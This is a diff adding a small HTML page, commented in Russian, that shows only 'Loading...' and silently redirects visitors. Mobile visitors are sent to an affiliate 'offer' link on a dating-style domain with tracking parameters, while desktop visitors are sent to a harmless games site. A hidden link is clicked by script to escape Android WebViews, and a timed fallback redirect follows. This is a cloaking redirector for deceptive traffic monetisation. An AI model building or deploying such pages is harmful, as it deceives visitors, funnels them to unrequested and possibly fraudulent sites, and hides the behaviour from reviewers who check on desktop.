@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Loading...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <style>
+    body {
+      background: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 40px;
+      user-select: none;
+    }
+    #clicker { display: none; }
+  </style>
+
+  <script>
+    /* ======== ОФФЕРЫ ======== */
+    const offers = [
+      
+      "https://grzvkg.trueamouronline.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=212364&s2=2189435"
+    ];
+
+    /* -------- РАНДОМ -------- */
+    function hashString(s) {
+      let h = 0;
+      for (let i = 0; i < s.length; i++) {
+        h = ((h << 5) - h) + s.charCodeAt(i);
+        h |= 0;
+      }
+      return Math.abs(h);
+    }
+
+    const salt = Math.floor(Date.now() / (1000 * 60 * 15));
+    const seed = navigator.userAgent + salt;
+    const idx = hashString(seed) % offers.length;
+    const offerURL = offers[idx];
+
+    /* ======== МОБИЛА / ПК ======== */
+    const isMobile = /android|iphone|ipad|ipod/i.test(navigator.userAgent);
+    const desktopURL = "https://poki.com";
+
+    const targetURL = isMobile ? offerURL : desktopURL;
+
+    /* ======== РЕДИРЕКТ ======== */
+    function startRedirect() {
+      const a = document.getElementById("clicker");
+      a.href = targetURL;
+
+      // Клик — обязательный для Android (открывает ВНЕ WebView)
+      a.click();
+
+      // Резервный переход
+      setTimeout(() => { window.location.href = targetURL; }, 300);
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      setTimeout(startRedirect, 500);
+    });
+  </script>
+</head>
+
+<body>
+  <p>Loading...</p>
+  <a id="clicker" href="#" target="_self"></a>
+</body>
+</html>
+
+
